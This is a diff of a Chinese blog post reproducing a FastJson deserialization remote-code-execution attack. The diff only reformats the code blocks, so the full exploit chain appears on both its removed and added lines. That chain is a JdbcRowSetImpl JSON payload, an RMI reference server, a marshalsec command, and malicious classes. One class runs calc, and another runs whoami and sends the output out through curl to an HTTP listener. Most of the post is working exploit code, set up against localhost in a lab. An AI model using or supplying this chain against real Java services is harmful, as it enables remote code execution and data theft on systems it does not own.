@@ -118,101 +118,22 @@
 <p>使用的IDE为IDEA，下载FastJson后导入IDEA。</p>
 <p>从File - Project Structure - Modules - Dependencies导入</p>
 <p>创建poc为如下：</p>
-<pre><code>import com.alibaba.fastjson.JSON;
-
-
-public class poc {
-
-    public static void main(String[] argv) {
-        String payload = &quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},&quot; +
-                &quot;\&quot;xxxx\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +
-                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true}}}&quot;;
-        JSON.parse(payload);
-    }
-
-}
-</code></pre><p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class poc &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] argv) &#123;</span><br><span class="line">        String payload = &quot;&#123;\&quot;name\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot; +</span><br><span class="line">                &quot;\&quot;xxxx\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:&quot; +</span><br><span class="line">                &quot;\&quot;rmi://localhost:1099/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&#125;&quot;;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="\2019\07\FastJson-反序列化\1563011101595.png" alt="1563011101595"></p>
 <p>创建一个RMI服务器。可以利用如下的JAVA代码。</p>
-<pre><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;
-import javax.naming.Reference;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
-
-public class rmiServer {
-
-    public static void main(String[] args) throws Exception {
-        Registry registry = LocateRegistry.createRegistry(1099);
-        Reference reference = new Reference(&quot;Exloit&quot;,
-                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);
-        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-        registry.bind(&quot;Exploit&quot;,referenceWrapper);
-    }
-}
-</code></pre><p>或者采用mar创建一个RMI服务器。</p>
-<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit
-</code></pre><p>再开启一个HTTP服务，下面写入一个恶意class文件。</p>
-<pre><code>import javax.naming.Context;
-import javax.naming.Name;
-import javax.naming.spi.ObjectFactory;
-import java.io.IOException;
-import java.util.Hashtable;
-
-public class Exploit implements ObjectFactory {
-
-    @Override
-    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) {
-        exec(&quot;xterm&quot;);
-        return null;
-    }
-
-    public static String exec(String cmd) {
-        try {
-            Runtime.getRuntime().exec(&quot;calc&quot;);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        return &quot;&quot;;
-    }
-
-    public static void main(String[] args) {
-        exec(&quot;123&quot;);
-    }
-}
-</code></pre><p>此处利用mar创建的RMI服务器来验证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class rmiServer &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference reference = new Reference(&quot;Exloit&quot;,</span><br><span class="line">                &quot;Exploit&quot;,&quot;http://localhost:8000/&quot;);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(&quot;Exploit&quot;,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或者采用mar创建一个RMI服务器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Exploit</span><br></pre></td></tr></table></figure>
+<p>再开启一个HTTP服务，下面写入一个恶意class文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Exploit implements ObjectFactory &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) &#123;</span><br><span class="line">        exec(&quot;xterm&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String exec(String cmd) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        exec(&quot;123&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此处利用mar创建的RMI服务器来验证：</p>
 <p><img src="\2019\07\FastJson-反序列化\1563012977594.png" alt="1563012977594"></p>
 <p>查看HTTP服务，可以看到请求的恶意class请求。</p>
 <p><img src="\2019\07\FastJson-反序列化\1563013067020.png" alt="1563013067020"></p>
 <p>如果请求了RMI服务后一直卡在没有请求HTTP服务的话，可以查看一下防火墙设置。我就不说卡在这里多久了。23333</p>
 <p>当然如果也可以使用之前老RCE的恶意class文件</p>
-<pre><code>import java.io.BufferedInputStream;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-public class exploit2 {
-    public static String exec(String cmd) throws Exception {
-        String sb = &quot;&quot;;
-        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
-        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
-        String lineStr;
-        while ((lineStr = inBr.readLine()) != null)
-            sb += lineStr + &quot;\n&quot;;
-        inBr.close();
-        in.close();
-        return sb;
-    }
-    public exploit2() throws Exception {
-        String result = &quot;&quot;;
-        result = exec(&quot;whoami&quot;);
-        String cmd=&quot;curl http://localhost:8000/&quot;+result;
-        throw new Exception(exec(cmd));
-    }
-    public static void main(String[] args) throws Exception {
-        String result = &quot;&quot;;
-        result = exec(&quot;whoami&quot;);
-        String cmd=&quot;curl http://localhost:8000/&quot;+result;
-        throw new Exception(exec(cmd));
-    }
-}
-</code></pre><p>执行后，查看携带响应的请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">public class exploit2 &#123;</span><br><span class="line">    public static String exec(String cmd) throws Exception &#123;</span><br><span class="line">        String sb = &quot;&quot;;</span><br><span class="line">        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        while ((lineStr = inBr.readLine()) != null)</span><br><span class="line">            sb += lineStr + &quot;\n&quot;;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        return sb;</span><br><span class="line">    &#125;</span><br><span class="line">    public exploit2() throws Exception &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        result = exec(&quot;whoami&quot;);</span><br><span class="line">        String cmd=&quot;curl http://localhost:8000/&quot;+result;</span><br><span class="line">        throw new Exception(exec(cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String result = &quot;&quot;;</span><br><span class="line">        result = exec(&quot;whoami&quot;);</span><br><span class="line">        String cmd=&quot;curl http://localhost:8000/&quot;+result;</span><br><span class="line">        throw new Exception(exec(cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行后，查看携带响应的请求</p>
 <p><img src="\2019\07\FastJson-反序列化\1563013609323.png" alt="1563013609323"></p>
 <p>内容部分POC来源：<a href="https://www.03sec.com/3240.shtml" target="_blank" rel="noopener">https://www.03sec.com/3240.shtml</a></p>
 
